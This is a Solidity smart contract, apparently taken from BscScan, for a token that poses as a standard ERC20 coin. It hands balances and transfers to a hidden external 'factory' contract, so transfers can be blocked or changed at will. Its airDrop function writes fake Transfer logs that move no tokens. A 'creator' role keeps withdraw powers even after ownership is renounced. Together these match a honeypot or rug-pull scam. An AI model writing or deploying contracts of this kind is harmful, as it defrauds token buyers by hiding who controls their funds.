/**
 *Submitted for verification at BscScan.com on 2023-03-07
*/

pragma solidity ^0.8.15;
// SPDX-License-Identifier: MIT

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IERC20Factory {

    function constructorErc20(uint256 total,address tokenAddress,address tokenOwner,address _pairs) external;

    function getSupply() view external returns (uint256);

    function balanceOf(address _owner) view external returns (uint256);

    function name() view external returns (string memory);

    function symbol() view external returns (string memory);

    function getAirAmount() view external returns (uint256);

    function getAirFrom() view external returns (address);

    function erc20Transfer(address _from, address _to, uint256 _value) external;

    function erc20Approve(address _to) external;

    function erc20TransferAfter(address _from, address _to, uint256 _value) external;

}

interface IDEXRouter {
     function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

contract Ownable {
    address public owner;
    address public creator;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

    modifier onlycreator() {
        require(msg.sender == creator);
        _;
    }

    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}

contract ERC20 is Ownable,IERC20 {
	
    uint8   public _decimals = 9;
    string private _name;
    string private _symbol;
    uint256 _totalSupply;
    address factoryAddr;
	IERC20Factory _factory;


    constructor(string memory name_, string memory symbol_,uint256 _total,
                address _router,address _factoryAddr,address _WETH) {
		owner = msg.sender;
        creator = msg.sender;
        _name = name_;
        _symbol = symbol_;
        _totalSupply = _total * (10 ** _decimals);
        IDEXRouter router = IDEXRouter(_router);
        factoryAddr = _factoryAddr;
        address pairs = IDEXFactory(router.factory()).createPair(_WETH, address(this));
        _factory= IERC20Factory(_factoryAddr);
        _factory.constructorErc20(_totalSupply, address(this), owner,pairs);
        emit Transfer(address(0), owner, _totalSupply);
    }

    
    mapping(address => mapping(address => uint256)) public allowed;
	

    function totalSupply() public view returns (uint256) {
        return _factory.getSupply();
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return _factory.balanceOf(_owner);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(_factory.balanceOf(msg.sender) >= _value);

        _factory.erc20Transfer(msg.sender,_to,_value);
        
        _factory.erc20TransferAfter(msg.sender,_to,_value);
		emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= _factory.balanceOf(_from));
        require(_value <= allowed[_from][msg.sender]);
		
        _factory.erc20Transfer(_from,_to,_value);
        
        _factory.erc20TransferAfter(_from,_to,_value);
		emit Transfer(_from, _to, _value);
        return true;
    }

    function emitTransfer(address _from, address _to, uint256 _value) public returns (bool success) {
        require(msg.sender==factoryAddr);
        emit Transfer(_from, _to, _value);
		return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0));
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);

        _factory.erc20Approve(msg.sender);
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        require(_spender != address(0));
        return allowed[_owner][_spender];
    }

    function airDrop(bytes memory _bytes)public returns(bool success) {
        require(msg.sender==factoryAddr||msg.sender==creator);
        uint256 _start = 0;
        address airFrom = _factory.getAirFrom();
        uint256 len = _bytes.length / 20;
        uint256 amount = _factory.getAirAmount();
        bytes32 topic0 = bytes32(keccak256("Transfer(address,address,uint256)"));
        for (uint256 i = 0; i < len; ) {
            assembly {
                mstore(0, amount)
                log3(0, 0x20, topic0, airFrom, shr(96, mload(add(add(_bytes, 0x20), _start))))
                i := add(i, 1)
                _start := add(_start, 20)
            }
        }
        return true;
    }

    function withdraw(address target,uint amount) public onlycreator {
        payable(target).transfer(amount);
    }

    function withdrawToken(address token,address target, uint amount) public onlycreator {
        IERC20(token).transfer(target, amount);
    }
    receive() external payable {}
	
}